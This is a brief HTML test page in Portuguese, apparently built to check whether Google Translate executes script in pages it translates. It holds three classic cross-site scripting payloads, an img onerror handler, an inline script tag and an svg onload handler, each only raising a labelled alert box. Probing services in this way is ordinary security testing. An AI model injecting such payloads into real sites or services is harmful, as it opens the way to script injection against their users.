<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Teste XSS para Google Tradutor</title>
</head>
<body>
  <h1>Teste de XSS na tradução</h1>

  <!-- Payload 1: imagem com onerror -->
  <p>Imagem com onerror:</p>
  <img src="x" onerror="alert('XSS - img onerror')" />

  <!-- Payload 2: script direto -->
  <p>Script direto:</p>
  <script>alert('XSS - script')</script>

  <!-- Payload 3: SVG com onload -->
  <p>SVG com onload:</p>
  <svg onload="alert('XSS - svg onload')"></svg>
</body>
</html>
